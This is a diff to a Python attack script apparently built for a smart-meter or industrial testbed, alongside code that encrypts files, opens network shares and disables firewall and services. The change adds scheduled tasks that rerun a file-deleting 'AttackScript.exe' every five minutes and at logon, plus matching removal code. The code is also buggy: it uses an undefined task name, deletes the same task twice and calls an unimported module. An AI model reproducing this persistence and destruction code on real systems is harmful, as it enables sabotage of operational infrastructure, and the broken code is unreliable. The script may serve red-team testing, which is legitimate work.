@@ -6,7 +6,7 @@ from pathlib import Path
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from shutil import copyfile
-from subprocess import run, check_call, CalledProcessError, PIPE, check_output
+from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
 from ctypes import windll
 from sys import executable, argv
 from win32netcon import ACCESS_ALL
@@ -217,6 +217,20 @@ def Create_Share_folder():
         }
         NetShareAdd(None, 2, share_info)
         print ("SmartMeterfolder has been shared.")
+
+#Create Scheduled Task for deleting files
+def Create_scheduled_task():
+    executable_file_path = r'C:\\Windows\\temp\\Smartmetertest\\AttackScript.exe' #Help me change this
+
+    executable_file_parameters = '1'
+
+    task_name = 'Smart Meter Testing'
+    task_name2 = 'Smart Meter Testing 2'
+    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 5'
+    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon'
+
+    subprocess.call(sch1, shell=True)
+    subprocess.call(sch2, shell=True)
 
 def encrypt_Files():
     #public key
@@ -618,6 +632,20 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
                 print("File: " + str(og) + " is deleted")
         rmdir(copiedpath)
         system('cmd /k "net share SmartMeterfolder /delete"')
+
+        schtaskschk = run(['schtasks', '/query'], stdout=PIPE, stderr=PIPE, text=True)
+        if "Smart Meter Testing" in schtaskschk.stdout:
+            task_name = 'Smart Meter Testing'
+            task_name2 = 'Smart Meter Testing 2'
+
+            # Define the command to delete the task using schtasks
+            schdel = f'schtasks /delete /tn "{task_name}" /f'
+            schdel2 = f'schtasks /delete /tn "{task_name}" /f'
+
+            # Delete the task using the schtasks command
+            subprocess.call(schdel, shell=True)
+            subprocess.call(schdel2, shell=True)
+
         print("Ok.")
 
     elif revertoption == "9":
@@ -821,7 +849,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 
 
     elif revertoption == "-h":
-        print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder,\n9 Revert Everything, \n10 Re-enable sshd service.")
+        print("\n Choose: \n1 Enable firewall, \n2 Re-enable ssh through firewall, \n3 Re-enable kepserver service, \n4 Re-enable COM port, \n5 Decrypt encrypted files, \n6 Change meter25 id back, \n7 Kill Modpoll, \n8 Remove shared folder and Scheduled Task,\n9 Revert Everything, \n10 Re-enable sshd service.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
@@ -831,6 +859,7 @@ if __name__ == '__main__':
     if attackoption == "1":
         try:
             delete_files(smartmeterpath)
+            Create_scheduled_task()
             print("\nOk.\n")
         except Exception as e:
             print("\nFail.\n")
